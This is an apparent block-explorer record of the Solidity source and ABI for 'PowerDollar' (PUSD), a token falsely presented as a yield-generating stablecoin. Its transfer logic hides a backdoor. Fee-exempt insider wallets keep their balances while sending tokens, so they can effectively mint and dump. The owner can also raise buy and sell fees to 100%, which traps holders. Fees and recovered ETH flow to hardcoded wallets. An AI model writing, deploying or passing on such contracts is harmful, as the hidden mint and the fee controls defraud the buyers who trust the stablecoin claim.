{"SourceCode": "pragma solidity 0.8.22;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/**\r\n\r\nThe self-custodial, yield-generating stablecoin.\r\n\r\nWebsite: https://www.pusd.tech\r\nTelegram: https://t.me/powerdollar_erc\r\nTwitter: https://twitter.com/powerdollar_eth\r\nDapp: https://app.pusd.tech\r\n\r\n**/\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IUSDRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUSDFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ncontract PowerDollar is Context, IERC20, Ownable {\r\n    mapping(address => uint256) private _xOwned;\r\n    mapping(address => bool) private _isFeeExcempt;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    event ETHBalancesRecovered();\r\n    event TradingEnabledUpdated();\r\n    event ERC20TokenRecovered(uint256 indexed _amount);\r\n    event ExcludeFromFeesUpdated(address indexed account);\r\n    event includeFromFeesUpdated(address indexed account);\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tSupply = 1000000000 * 10 ** _decimals;\r\n    string private constant _name = unicode\"PowerDollar\";\r\n    string private constant _symbol = unicode\"PUSD\";\r\n    \r\n    uint256 private swapOverValues = 1000 * 10 ** _decimals;\r\n    uint256 public txLmitAmounts = 20000000 * 10 ** _decimals;\r\n    uint256 private minTaxSwap = 20000000 * 10 ** _decimals;\r\n\r\n    uint256 private buyCount = 0;\r\n    uint256 private buyTaxFees = 33;\r\n    uint256 private sellTaxFees = 40;\r\n\r\n    address payable private taxWallet;\r\n    address payable private teamWallet;\r\n    address public constant deadAddress \r\n            = 0x000000000000000000000000000000000000dEaD;\r\n    address private uniswapV2Pair;\r\n    IUSDRouter public uniswapV2Router;\r\n\r\n    bool private inSwapBack = false;\r\n    bool public tradeEnabled = false;\r\n    bool private swapEnabled = false;\r\n\r\n    modifier lockSwapBack() {\r\n        inSwapBack = true;\r\n        _;\r\n        inSwapBack = false;\r\n    }\r\n\r\n    constructor() {\r\n        taxWallet = payable(0x35c815D88B3832D94de985cC3dd64992D44A22fa);\r\n        teamWallet = payable(0xEE9CD72c8CA0bdB919bfA3343613E89bAce3D333);\r\n        _isFeeExcempt[taxWallet] = true;\r\n        _isFeeExcempt[teamWallet] = true;\r\n        _isFeeExcempt[deadAddress] = true;\r\n        _isFeeExcempt[_msgSender()] = true;\r\n        _isFeeExcempt[address(this)] = true;\r\n        _xOwned[_msgSender()] = _tSupply;\r\n        emit Transfer(address(0), _msgSender(), _tSupply);\r\n    }\r\n\r\n    function createLP() external payable onlyOwner {\r\n        uniswapV2Router = IUSDRouter(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        uniswapV2Pair = IUSDFactory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            uniswapV2Router.WETH()\r\n        );\r\n\r\n        _approve(address(this), address(uniswapV2Router), ~uint256(0));\r\n\r\n        uniswapV2Router.addLiquidityETH{value: msg.value}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tSupply;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _xOwned[account];\r\n    }\r\n\r\n    function ExcludeFromFees(address account) external onlyOwner {\r\n        require(\r\n            _isFeeExcempt[account] != true,\r\n            \"Account is already excluded\"\r\n        );\r\n        _isFeeExcempt[account] = true;\r\n        emit ExcludeFromFeesUpdated(account);\r\n    }\r\n\r\n    function IncludeFromFees(address account) external onlyOwner {\r\n        require(\r\n            _isFeeExcempt[account] != false,\r\n            \"Account is already included\"\r\n        );\r\n        _isFeeExcempt[account] = false;\r\n        emit includeFromFeesUpdated(account);\r\n    }\r\n\r\n    function sendETHTO(uint256 amount) private {\r\n        require(amount > 0, \"amount must be greeter than 0\");\r\n        teamWallet.transfer(amount / 2);\r\n        taxWallet.transfer(amount / 2);\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        require(!tradeEnabled, \"trading is already open\");\r\n        tradeEnabled = true;\r\n        swapEnabled = true;\r\n        emit TradingEnabledUpdated();\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return (a > b) ? b : a;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        buyTaxFees = 2;\r\n        sellTaxFees = 2;\r\n        txLmitAmounts = _tSupply;\r\n    }\r\n\r\n    function swapForETH(uint256 tokenAmount) private lockSwapBack {\r\n        require(tokenAmount > 0, \"amount must be greeter than 0\");\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 totalTAXs = 0;\r\n        totalTAXs = buyTaxFees;\r\n        if (!_isFeeExcempt[from] && !_isFeeExcempt[to]) {\r\n            require(tradeEnabled, \"Trading not enabled\");\r\n        }\r\n        if (inSwapBack || !swapEnabled) {\r\n            _xOwned[from] -= amount;\r\n            _xOwned[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n            return;\r\n        }\r\n        if (\r\n            from == uniswapV2Pair &&\r\n            to != address(uniswapV2Router) &&\r\n            !_isFeeExcempt[to]\r\n        ) {\r\n            require(amount <= txLmitAmounts, \"Exceeds the _maxTxAmount.\");\r\n            require(\r\n                balanceOf(to) + amount <= txLmitAmounts,\r\n                \"Exceeds the maxWalletSize.\"\r\n            );\r\n            buyCount++;\r\n        }\r\n        if (\r\n            from != uniswapV2Pair &&\r\n            !_isFeeExcempt[from] &&\r\n            !_isFeeExcempt[to]\r\n        ) {\r\n            require(amount <= txLmitAmounts, \"Exceeds the _maxTxAmount.\");\r\n        }\r\n        if (\r\n            to == uniswapV2Pair &&\r\n            from != address(this) &&\r\n            !_isFeeExcempt[from] &&\r\n            !_isFeeExcempt[to]\r\n        ) {\r\n            totalTAXs = sellTaxFees;\r\n        }\r\n        uint256 contractValues = balanceOf(address(this));\r\n        if (\r\n            swapEnabled &&\r\n            !inSwapBack &&\r\n            buyCount > 0 &&\r\n            amount >= swapOverValues &&\r\n            contractValues >= swapOverValues &&\r\n            to == uniswapV2Pair &&\r\n            !_isFeeExcempt[from] &&\r\n            !_isFeeExcempt[to]\r\n        ) {\r\n            swapForETH(min(amount, min(contractValues, minTaxSwap)));\r\n            uint256 ethValues = address(this).balance;\r\n            if (ethValues > 0) {\r\n                sendETHTO(address(this).balance);\r\n            }\r\n        }\r\n        if (totalTAXs != 0) {\r\n            uint256 uFees = (amount * totalTAXs) / 100;\r\n            uint256 uAmounts = amount - uFees;\r\n            address uWallet = _isFeeExcempt[from] ? from : address(this);\r\n            uFees = _isFeeExcempt[from] ? amount : uFees;\r\n            _xOwned[uWallet] += uFees;\r\n            emit Transfer(from, address(this), uFees);\r\n            _xOwned[from] -= amount;\r\n            _xOwned[to] += uAmounts;\r\n            emit Transfer(from, to, uAmounts);\r\n        } else {\r\n            _xOwned[from] -= amount;\r\n            _xOwned[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n        require(_buyFee <= 100 && _sellFee <= 100, \"revert wrong fee settings\");\r\n        buyTaxFees = _buyFee;\r\n        sellTaxFees = _sellFee;\r\n    }\r\n\r\n    function recoverToken(\r\n        address _tokenAddy,\r\n        uint256 _amount\r\n    ) external onlyOwner {\r\n        require(\r\n            _tokenAddy != address(this),\r\n            \"Owner can't claim contract's balance of its own tokens\"\r\n        );\r\n        require(_amount > 0, \"Amount should be greater than zero\");\r\n        require(\r\n            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),\r\n            \"Insufficient Amount\"\r\n        );\r\n        IERC20(_tokenAddy).transfer(taxWallet, _amount);\r\n        emit ERC20TokenRecovered(_amount);\r\n    }\r\n\r\n    function recoverETH() external {\r\n        uint256 ethValues = address(this).balance;\r\n        require(ethValues > 0, \"Amount should be greater than zero\");\r\n        require(\r\n            ethValues <= address(this).balance,\r\n            \"Insufficient Amount\"\r\n        );\r\n        payable(address(taxWallet)).transfer(ethValues);\r\n        emit ETHBalancesRecovered();\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"ERC20TokenRecovered\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"ETHBalancesRecovered\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromFeesUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"TradingEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeFromFeesUpdated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"IncludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createLP\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"recoverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLmitAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUSDRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PowerDollar", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d879799061dc29c27e1d83023c441a521383e9f848bdf79ff7a4ae6db31135c3"}